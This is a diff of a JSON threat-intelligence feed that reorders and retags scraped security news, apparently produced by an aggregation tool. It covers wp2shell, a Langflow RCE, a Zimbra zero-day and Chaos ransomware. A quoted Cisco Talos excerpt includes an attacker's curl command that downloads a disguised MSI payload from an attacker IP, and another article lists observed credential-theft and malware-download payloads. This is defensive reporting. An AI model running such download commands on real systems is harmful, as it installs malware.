Nextcloud proxy path,\" Caitlin Condon, vice president of security research at VulnCheck, said in a post on LinkedIn. The cybersecurity company said it identified about 170 vulnerable systems exposed across 24 countries. The disclosure comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added four security flaws to its Known Exploited Vulnerabilities ( KEV ) catalog, including two WordPress bugs tracked as wp2shell ( CVE-2026-60137 and CVE-2026-63030 ), along with a stack-based buffer overflow in DD-WRT ( CVE-2021-27137 ) and an unauthenticated remote code execution issue in Langflow ( CVE-2026-0770 ). \"wp2shell is one of the most significant WordPress Core security events in recent years,\" Wordfence said . \"The combination of unauthenticated reachability, no plugin or theme requirement, a large global attack surface, a path to administrator access and code execution, as well as public proof-of-concept exploit availability makes this vulnerability chain unusually serious.\" Attack data captured by the WordPress security company shows that threat actors are issuing requests to exploit the REST API batch request route-confusion issue and an unauthenticated SQL injection to achieve code execution. VulnCheck also said it had verified more than two-dozen unique PoC exploits targeting WP2Shell as of July 19, 2026. \"Affected users should update to a fixed version of WordPress as soon as possible, given the overwhelming likelihood that various public exploits and large-scale exploitation will follow the high-profile disclosure,\" it added . As for CVE-2026-0770, KEVIntel's Ryan Dewhurst told The Hacker News that first in-the-wild attack efforts targeting the flaw were detected against its sensors on June 27, 2026, recording 137 exploitation attempts from 46 unique attacker IP addresses associated with 17 countries since then. No less than 75 attempts, which account for more than half of the activity, originated from 20 attacker IP addresses during the last seven days. Observed payloads include base command execution checks, attempts to extract the contents of \"/etc/passwd\" or access AWS credentials, environment variable collection, malware downloads using wget or curl, and shell script execution to install second-stage payloads",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
@@ -2162,19 +2093,30 @@
           ],
           "actor_attribution": [],
           "affected_industries": [],
-          "affected_products": [],
+          "affected_products": [
+            "WordPress",
+            "AWS"
+          ],
           "tools_used": [],
           "cve_ids": [
-            "CVE-2026-29059"
+            "CVE-2026-29059",
+            "CVE-2026-60137",
+            "CVE-2026-63030",
+            "CVE-2021-27137",
+            "CVE-2026-0770"
           ],
           "attack_techniques": [],
           "urgency_signals": [
             "actively_exploited",
-            "preauth_unauth"
+            "preauth_unauth",
+            "poc_available"
           ],
           "content_type": "news_report",
           "confidence_tier": "tier_4_news",
-          "role_map": {},
+          "role_map": {
+            "WordPress": "target",
+            "AWS": "target"
+          },
           "weak_tags": {
             "products": []
           }
@@ -2194,19 +2136,30 @@
             ],
             "actor_attribution": [],
             "affected_industries": [],
-            "affected_products": [],
+            "affected_products": [
+              "WordPress",
+              "AWS"
+            ],
             "tools_used": [],
             "cve_ids": [
-              "CVE-2026-29059"
+              "CVE-2026-29059",
+              "CVE-2026-60137",
+              "CVE-2026-63030",
+              "CVE-2021-27137",
+              "CVE-2026-0770"
             ],
             "attack_techniques": [],
             "urgency_signals": [
               "actively_exploited",
-              "preauth_unauth"
+              "preauth_unauth",
+              "poc_available"
             ],
             "content_type": "news_report",
             "confidence_tier": "tier_4_news",
-            "role_map": {},
+            "role_map": {
+              "WordPress": "target",
+              "AWS": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -3152,123 +3105,6 @@
       ]
     },
     {
-      "cluster_id": "332f35118d",
-      "priority_score": 12,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "apt_espionage",
-          "phishing_social_eng",
-          "ransomware_extortion",
-          "zero_day"
-        ],
-        "actor_attribution": [
-          "APT28"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "government"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2025-66376"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "zero_day"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Dark Reading",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets",
-        "link": "https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets",
-        "published": "2026-07-23T21:23:18+00:00",
-        "summary": "A state-sponsored threat group, dubbed \"Laundry Bear,\" sends \"half-click\" phishing emails that require a victim only to open or preview the message.",
-        "full_body": "Cyberattacks & Data Breaches Cyber Risk Application Security Vulnerabilities & Threats News Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets A state-sponsored threat group, dubbed \"Laundry Bear,\" sends \"half-click\" phishing emails that require a victim only to open or preview the message. Rob Wright , Senior News Director , Dark Reading July 23, 2026 4 Min Read Source: Anton Petrus via Getty Images Russian state-backed threat actors are compromising networks of Western governments and enterprises through the Zimbra Collaboration Suite (ZCS), according to intelligence and cybersecurity agencies in more than a dozen countries. In a joint advisory Thursday, the US government and several allied nations warned that an advanced persistent threat (APT) dubbed \"Laundry Bear\" has been targeting ZCS customers since July 2025. Laundry Bear actors used a zero-day vulnerability in ZCS , tracked as CVE-2025-66376, in a phishing campaign that featured what experts describe as a \"half-click exploit\" to breach Zimbra webmail servers. \"Unlike traditional phishing campaigns that persuade a user into taking an action, such as clicking a link or opening a file, Laundry Bear’s latest campaign leverages a view-based exploit that only requires a user to view a malicious email within a vulnerable version of the webmail service,\" the agencies said in the advisory. Related: Brazilian Banking Trojan Actively Spreading in Portugal The campaign is designed \"almost certainly to gather sensitive information for the Russian Federation,\" according the advisory. The Laundry Bear attacks mark yet another threat from Russian APTs against US organizations. Zimbra Zero-Day Activity Zimbra patched CVE-2025-66376 in November 2025 with the release of version 10.1.13, though the company did not disclose the flaw until weeks later. The initial release notes for v10.1.13 merely described the flaw as \"a stored XSS vulnerability in the Classic UI where attackers could abuse CSS @import directives in email HTML,\" with no CVE at the time. The National Institute of Standards and Technology (NIST) and Mitre did not publish entries for the Zimbra flaw until early January. Dark Reading contacted Zimbra and parent company Synacor for comment on the apparent delayed disclosure for CVE-2025-66376, but neither company responded at press time. In a March 17 blog post , cybersecurity firm Seqrite reported that Russian threat actors had exploited CVE-2025-66376 in the compromise of a Ukrainian government agency. At the time, Seqrite attributed the activity, which it called \"Operation GhostMail,\" to APT28, also known as Fancy Bear . The following day, the US Cybersecurity and Infrastructure Security Agency (CISA) added the high-severity vulnerability to its Known Exploited Vulnerabilities (KEV) catalog on March 18. Mitre also gave the vulnerability a 7.2 CVSS score. However, intelligence and cybersecurity agencies from 15 different countries revealed the exploitation activity was far more extensive and dated back to at least July 2025. They also tied the phishing campaign to a different Russian \"Bear.\" Related: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain Laundry Bear's 'Half-Click' Zimbra Exploit According to the joint advisory, the Netherlands General Intelligence and Security Service (AIVD) first identified Laundry Bear in May as a new Russian state-sponsored APT adjacent to other more well-known groups. Laundry Bear, the authoring agencies said, had previously relied on unsophisticated tactics such as password spraying and conventional phishing attacks until last year, when actors began using a \"novel exploit\" for CVE-2025-66376 that no longer required targeted victims to click on a link or open a malicious email attachment. In a blog post on Thursday, Proofpoint, which contributed to the government investigations into Laundry Bear, explained that the Zimbra vulnerability allowed the threat actors to craft \"half-click\" phishing emails that only nee",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "phishing_social_eng",
-            "zero_day",
-            "apt_espionage"
-          ],
-          "actor_attribution": [
-            "APT28"
-          ],
-          "affected_industries": [
-            "financial_services",
-            "government"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2025-66376"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Dark Reading",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets",
-          "link": "https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets",
-          "published": "2026-07-23T21:23:18+00:00",
-          "summary": "A state-sponsored threat group, dubbed \"Laundry Bear,\" sends \"half-click\" phishing emails that require a victim only to open or preview the message.",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "phishing_social_eng",
-              "zero_day",
-              "apt_espionage"
-            ],
-            "actor_attribution": [
-              "APT28"
-            ],
-            "affected_industries": [
-              "financial_services",
-              "government"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2025-66376"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "abfdfb7a02",
       "priority_score": 12,
       "member_count": 1,
@@ -3556,7 +3392,7 @@
         ]
       },
       "primary": {
-        "source": "Microsoft Threat Intelligence",
+        "source": "Microsoft Security Blog",
         "cohort": "threat_research_primary",
         "title": "Email threat landscape: Q2 2026 trends and insights",
         "link": "https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/",
@@ -3598,7 +3434,7 @@
       },
       "corroborating_sources": [
         {
-          "source": "Microsoft Threat Intelligence",
+          "source": "Microsoft Security Blog",
           "cohort": "threat_research_primary",
           "title": "Email threat landscape: Q2 2026 trends and insights",
           "link": "https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/",
@@ -3637,7 +3473,7 @@
           }
         },
         {
-          "source": "Microsoft Security Blog",
+          "source": "Microsoft Threat Intelligence",
           "cohort": "threat_research_primary",
           "title": "Email threat landscape: Q2 2026 trends and insights",
           "link": "https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/",
@@ -3873,6 +3709,123 @@
       ]
     },
     {
+      "cluster_id": "332f35118d",
+      "priority_score": 11,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "apt_espionage",
+          "phishing_social_eng",
+          "ransomware_extortion",
+          "zero_day"
+        ],
+        "actor_attribution": [
+          "APT28"
+        ],
+        "affected_industries": [
+          "financial_services",
+          "government"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2025-66376"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Dark Reading",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets",
+        "link": "https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets",
+        "published": "2026-07-23T21:23:18+00:00",
+        "summary": "A state-sponsored threat group, dubbed \"Laundry Bear,\" sends \"half-click\" phishing emails that require a victim only to open or preview the message.",
+        "full_body": "Cyberattacks & Data Breaches Cyber Risk Application Security Vulnerabilities & Threats News Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets A state-sponsored threat group, dubbed \"Laundry Bear,\" sends \"half-click\" phishing emails that require a victim only to open or preview the message. Rob Wright , Senior News Director , Dark Reading July 23, 2026 4 Min Read Source: Anton Petrus via Getty Images Russian state-backed threat actors are compromising networks of Western governments and enterprises through the Zimbra Collaboration Suite (ZCS), according to intelligence and cybersecurity agencies in more than a dozen countries. In a joint advisory Thursday, the US government and several allied nations warned that an advanced persistent threat (APT) dubbed \"Laundry Bear\" has been targeting ZCS customers since July 2025. Laundry Bear actors used a zero-day vulnerability in ZCS , tracked as CVE-2025-66376, in a phishing campaign that featured what experts describe as a \"half-click exploit\" to breach Zimbra webmail servers. \"Unlike traditional phishing campaigns that persuade a user into taking an action, such as clicking a link or opening a file, Laundry Bear’s latest campaign leverages a view-based exploit that only requires a user to view a malicious email within a vulnerable version of the webmail service,\" the agencies said in the advisory. Related: Brazilian Banking Trojan Actively Spreading in Portugal The campaign is designed \"almost certainly to gather sensitive information for the Russian Federation,\" according the advisory. The Laundry Bear attacks mark yet another threat from Russian APTs against US organizations. Zimbra Zero-Day Activity Zimbra patched CVE-2025-66376 in November 2025 with the release of version 10.1.13, though the company did not disclose the flaw until weeks later. The initial release notes for v10.1.13 merely described the flaw as \"a stored XSS vulnerability in the Classic UI where attackers could abuse CSS @import directives in email HTML,\" with no CVE at the time. The National Institute of Standards and Technology (NIST) and Mitre did not publish entries for the Zimbra flaw until early January. Dark Reading contacted Zimbra and parent company Synacor for comment on the apparent delayed disclosure for CVE-2025-66376, but neither company responded at press time. In a March 17 blog post , cybersecurity firm Seqrite reported that Russian threat actors had exploited CVE-2025-66376 in the compromise of a Ukrainian government agency. At the time, Seqrite attributed the activity, which it called \"Operation GhostMail,\" to APT28, also known as Fancy Bear . The following day, the US Cybersecurity and Infrastructure Security Agency (CISA) added the high-severity vulnerability to its Known Exploited Vulnerabilities (KEV) catalog on March 18. Mitre also gave the vulnerability a 7.2 CVSS score. However, intelligence and cybersecurity agencies from 15 different countries revealed the exploitation activity was far more extensive and dated back to at least July 2025. They also tied the phishing campaign to a different Russian \"Bear.\" Related: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain Laundry Bear's 'Half-Click' Zimbra Exploit According to the joint advisory, the Netherlands General Intelligence and Security Service (AIVD) first identified Laundry Bear in May as a new Russian state-sponsored APT adjacent to other more well-known groups. Laundry Bear, the authoring agencies said, had previously relied on unsophisticated tactics such as password spraying and conventional phishing attacks until last year, when actors began using a \"novel exploit\" for CVE-2025-66376 that no longer required targeted victims to click on a link or open a malicious email attachment. In a blog post on Thursday, Proofpoint, which contributed to the government investigations into Laundry Bear, explained that the Zimbra vulnerability allowed the threat actors to craft \"half-click\" phishing emails that only nee",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "phishing_social_eng",
+            "zero_day",
+            "apt_espionage"
+          ],
+          "actor_attribution": [
+            "APT28"
+          ],
+          "affected_industries": [
+            "financial_services",
+            "government"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2025-66376"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets",
+          "link": "https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets",
+          "published": "2026-07-23T21:23:18+00:00",
+          "summary": "A state-sponsored threat group, dubbed \"Laundry Bear,\" sends \"half-click\" phishing emails that require a victim only to open or preview the message.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "phishing_social_eng",
+              "zero_day",
+              "apt_espionage"
+            ],
+            "actor_attribution": [
+              "APT28"
+            ],
+            "affected_industries": [
+              "financial_services",
+              "government"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2025-66376"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "8013169017",
       "priority_score": 11,
       "member_count": 1,
@@ -3964,6 +3917,93 @@
                   0.3
                 ]
               ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "de2a131113",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "legal_professional"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Microsoft Security Blog",
+        "cohort": "threat_research_primary",
+        "title": "Real world incident response: Microsoft and AXA XL strengthen cyber resilience",
+        "link": "https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/",
+        "published": "2026-07-22T16:00:00+00:00",
+        "summary": "Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .",
+        "full_body": "Share Link copied to clipboard! Cyber incidents don’t wait—and effective response can’t either. In the age of AI where cyber incidents unfold at machine speed, having the right partnerships in place becomes paramount. While AI is expanding what’s possible, navigating this transformation can be challenging to do alone. That’s why our collaboration with AXA XL is so important—bringing Microsoft Defender Experts Cybersecurity Incident Response services directly to cyber insurance policyholders at the moment it matters most, helping organizations coordinate technical, business, and insurance decisions in parallel rather than in sequence. Get started with Microsoft Defender Experts Cybersecurity Incident Response This collaboration reflects Microsoft’s continued investment in building an incident response model designed for real-world conditions, where speed, trust, and alignment matter as much as technology. In a live incident, security, executive, legal, and insurance teams are all acting at once. Without pre-established coordination, those parallel efforts can slow containment and increase risk. Our approach to incident response—and our work with AXA XL —starts by aligning those paths before a crisis begins. For example, during a ransomware incident, security teams may be actively containing lateral movement while leadership evaluates operational impact, legal teams assess disclosure requirements, and insurers determine coverage pathways—all within the same window of time. When those decisions aren’t aligned, response slows and risk compounds. Decades of supporting customers through high-stakes cyber incidents have reinforced a clear truth: effective incident response extends beyond technical execution. It requires coordination across teams and partners before the crisis hits. That experience continues to shape how we design Defender Experts Cybersecurity Incident Response—and how we work with partners like AXA XL. Incident response must extend beyond technology As a global insurance provider, AXA XL plays a critical role in helping organizations navigate cyber risk and response. Through this collaboration, AXA XL policyholders gain coordinated access to Microsoft’s dedicated incident response teams—combining threat containment, restoration, and recovery with insurance, legal, and regulatory workflows. By aligning AXA XL’s cyber insurance capabilities with Defender Experts Cybersecurity Incident Response, organizations benefit from a more integrated response model while gaining access to incident response teams informed by Microsoft Threat Intelligence and two decades of experience responding to some of the world’s most complex and consequential cyber incidents. Previously, organizations often brought incident responders and insurers together in the middle of a crisis. With this collaboration, that relationship is already in place, reducing friction, delays, and uncertainty when time is most critical. AXA XL policyholders and Microsoft customers can now bring Defender Experts Cybersecurity Incident Response to the table the moment it matters—creating a clearer, more predictable path from detection to recovery. The outcome is not simply faster response, but confidence: knowing who to call, how response engages, and how recovery is operationalized before the next decision becomes urgent. The threat of a cybersecurity incident has long been ‘not if, but when,’ and in the wake of AI, the ‘when’ may quickly become ‘how often.’ The risks organizations are tasked with preventing and overcoming relative to cybersecurity and data privacy are growing exponentially. Partnering with experts can make all the difference where resilience in the face of adversity may be your only saving grace. AXA XL’s strategic partnerships with cyber incident response providers underscore our commitment to expertise, preparedness, and resilience. By drawing on a deep knowledge of internal expertise and external cyber specialists, we empower our insureds to re",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "legal_professional"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Microsoft Security Blog",
+          "cohort": "threat_research_primary",
+          "title": "Real world incident response: Microsoft and AXA XL strengthen cyber resilience",
+          "link": "https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/",
+          "published": "2026-07-22T16:00:00+00:00",
+          "summary": "Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "legal_professional"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_primary_research",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
             }
           }
         }
@@ -4195,93 +4235,6 @@
       ]
     },
     {
-      "cluster_id": "de2a131113",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "legal_professional"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Microsoft Security Blog",
-        "cohort": "threat_research_primary",
-        "title": "Real world incident response: Microsoft and AXA XL strengthen cyber resilience",
-        "link": "https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/",
-        "published": "2026-07-22T16:00:00+00:00",
-        "summary": "Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .",
-        "full_body": "Share Link copied to clipboard! Cyber incidents don’t wait—and effective response can’t either. In the age of AI where cyber incidents unfold at machine speed, having the right partnerships in place becomes paramount. While AI is expanding what’s possible, navigating this transformation can be challenging to do alone. That’s why our collaboration with AXA XL is so important—bringing Microsoft Defender Experts Cybersecurity Incident Response services directly to cyber insurance policyholders at the moment it matters most, helping organizations coordinate technical, business, and insurance decisions in parallel rather than in sequence. Get started with Microsoft Defender Experts Cybersecurity Incident Response This collaboration reflects Microsoft’s continued investment in building an incident response model designed for real-world conditions, where speed, trust, and alignment matter as much as technology. In a live incident, security, executive, legal, and insurance teams are all acting at once. Without pre-established coordination, those parallel efforts can slow containment and increase risk. Our approach to incident response—and our work with AXA XL —starts by aligning those paths before a crisis begins. For example, during a ransomware incident, security teams may be actively containing lateral movement while leadership evaluates operational impact, legal teams assess disclosure requirements, and insurers determine coverage pathways—all within the same window of time. When those decisions aren’t aligned, response slows and risk compounds. Decades of supporting customers through high-stakes cyber incidents have reinforced a clear truth: effective incident response extends beyond technical execution. It requires coordination across teams and partners before the crisis hits. That experience continues to shape how we design Defender Experts Cybersecurity Incident Response—and how we work with partners like AXA XL. Incident response must extend beyond technology As a global insurance provider, AXA XL plays a critical role in helping organizations navigate cyber risk and response. Through this collaboration, AXA XL policyholders gain coordinated access to Microsoft’s dedicated incident response teams—combining threat containment, restoration, and recovery with insurance, legal, and regulatory workflows. By aligning AXA XL’s cyber insurance capabilities with Defender Experts Cybersecurity Incident Response, organizations benefit from a more integrated response model while gaining access to incident response teams informed by Microsoft Threat Intelligence and two decades of experience responding to some of the world’s most complex and consequential cyber incidents. Previously, organizations often brought incident responders and insurers together in the middle of a crisis. With this collaboration, that relationship is already in place, reducing friction, delays, and uncertainty when time is most critical. AXA XL policyholders and Microsoft customers can now bring Defender Experts Cybersecurity Incident Response to the table the moment it matters—creating a clearer, more predictable path from detection to recovery. The outcome is not simply faster response, but confidence: knowing who to call, how response engages, and how recovery is operationalized before the next decision becomes urgent. The threat of a cybersecurity incident has long been ‘not if, but when,’ and in the wake of AI, the ‘when’ may quickly become ‘how often.’ The risks organizations are tasked with preventing and overcoming relative to cybersecurity and data privacy are growing exponentially. Partnering with experts can make all the difference where resilience in the face of adversity may be your only saving grace. AXA XL’s strategic partnerships with cyber incident response providers underscore our commitment to expertise, preparedness, and resilience. By drawing on a deep knowledge of internal expertise and external cyber specialists, we empower our insureds to re",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "legal_professional"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Microsoft Security Blog",
-          "cohort": "threat_research_primary",
-          "title": "Real world incident response: Microsoft and AXA XL strengthen cyber resilience",
-          "link": "https://www.microsoft.com/en-us/security/blog/2026/07/22/real-world-incident-response-microsoft-and-axa-xl-strengthen-cyber-resilience/",
-          "published": "2026-07-22T16:00:00+00:00",
-          "summary": "Our collaboration with AXA XL brings Microsoft Incident Response services directly to cyber insurance policyholders, helping organizations coordinate technical, business, and insurance decisions. The post Real world incident response: Microsoft and AXA XL strengthen cyber resilience appeared first on Microsoft Security Blog .",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "legal_professional"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "2bab6cab95",
       "priority_score": 10,
       "member_count": 1,
@@ -4422,6 +4375,103 @@
               "SonicWall": "target",
               "npm": "target",
               "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "a1940e8772",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach",
+          "phishing_social_eng",
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Cisco"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Cisco Talos",
+        "cohort": "threat_research_primary",
+        "title": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel",
+        "link": "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/",
+        "published": "2026-07-23T10:00:38+00:00",
+        "summary": "The Chaos ransomware group uses new malware \"msaRAT\" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.",
+        "full_body": "Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in February 2025. Although the number of listings on their data leak site remains relatively low, the group consistently targets large organizations and employs double extortion tactics. For initial access, they rely on spam emails and voice-based social engineering, commonly known as vishing. Once inside a network, their traditional post-compromise methodology involves abusing remote monitoring and management (RMM) tools to establish persistent access, while leveraging legitimate file-sharing software to exfiltrate data. For a detailed breakdown of their tactics, techniques, and procedures (TTPs), please refer to our previous blog. Figure 1. Chaos ransomware leak site. Infection chain Talos has identified a new Rust-based RAT used by the Chaos ransomware group, which we have named msaRAT. The name is derived from the binding names found in the binary (“msaOpen,” “msaClose,” “msaError,” “msaMessage”), as detailed in a later section. Figure 2 illustrates the end-to-end infection chain, from initial compromise through to the establishment of C2 communications via this RAT. Figure 2. Infection chain. After gaining access to a victim machine but prior to executing the ransomware, the attacker runs the following curl command to download an MSI file named “update_ms.msi” from an attacker-controlled server to the ProgramData directory on the victim machine, then executes it. Although port 443 is specified, the communication occurs over plain HTTP. In environments where firewall rules permit traffic based solely on port number without protocol inspection, this traffic will pass through undetected. curl.exe http://172.86.126.18:443/update_ms.msi -o C:\\programdata\\update_ms.msi The property information of this installer, which extracts the DLL file containing the RAT payload, contains details configured to impersonate a Windows update. Figure 3. Properties of “update_ms.msi” When this MSI file is executed, the custom action CA_Run_EA2AEBC3 is triggered upon completion of InstallFinalize . This custom action loads lib.dll, embedded in the MSI file's Binary table as Bin_lib_EA2AEBC3 , directly into memory. Figure 4. Structure of the MSI file. lib.dll 